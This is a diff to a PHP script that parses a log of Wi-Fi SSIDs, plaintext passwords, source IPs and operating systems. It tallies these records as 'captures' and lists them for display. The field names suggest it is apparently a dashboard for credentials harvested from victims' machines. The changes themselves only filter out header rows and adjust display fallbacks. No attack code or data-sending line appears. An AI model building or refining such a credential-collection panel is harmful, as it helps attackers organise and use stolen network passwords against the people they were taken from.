@@ -83,14 +83,22 @@ foreach ($lines as $lineNum => $line) {
     $fields = str_getcsv($line);
     if (count($fields) < 4) continue;
 
-    // Null-safe extraction with fallbacks to avoid "IP / OS / SSID / Pass" glitches
-    $ssid     = isset($fields[0]) ? trim($fields[0]) : 'unknown';
+    // Extract fields safely
+    $ssid     = isset($fields[0]) ? trim($fields[0]) : '';
     $pass     = isset($fields[1]) ? trim($fields[1]) : '';
-    $sourceIP = isset($fields[2]) ? trim($fields[2]) : 'offline';
-    $sourceOS = isset($fields[3]) ? trim($fields[3]) : 'unknown';
+    $sourceIP = isset($fields[2]) ? trim($fields[2]) : '';
+    $sourceOS = isset($fields[3]) ? trim($fields[3]) : '';
 
-    // Only process valid WiFi entries
-    if ($ssid === '' || $ssid === 'unknown' || $pass === '') continue;
+    // Hard filter: skip obvious header / garbage rows
+    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
+    if (
+        $ssid === '' ||
+        in_array($ssid, $badSsids, true) ||
+        $pass === '' ||
+        in_array($pass, ['Pass', 'password'], true)
+    ) {
+        continue;
+    }
 
     // Use current timestamp for display (log file itself doesn't store time)
     $timestamp = date('d M Y, h:i:s a');
@@ -98,12 +106,12 @@ foreach ($lines as $lineNum => $line) {
     $totalCaptures++;
 
     // Track unique SSIDs
-    if (!empty($ssid)) {
+    if ($ssid !== '') {
         $ssidCount[$ssid] = isset($ssidCount[$ssid]) ? $ssidCount[$ssid] + 1 : 1;
     }
 
     // Track source IPs
-    if (!empty($sourceIP)) {
+    if ($sourceIP !== '') {
         $ipCount[$sourceIP] = isset($ipCount[$sourceIP]) ? $ipCount[$sourceIP] + 1 : 1;
     }
 
@@ -122,8 +130,8 @@ foreach ($lines as $lineNum => $line) {
     $captureEntries[] = [
         'idx'      => $lineNum,
         'time'     => $timestamp,
-        'ip'       => $sourceIP,
-        'os'       => $sourceOS,
+        'ip'       => $sourceIP !== '' ? $sourceIP : 'offline',
+        'os'       => $sourceOS !== '' ? $sourceOS : 'unknown',
         'ssid'     => $ssid,
         'password' => $pass,
         'len'      => $passLength,
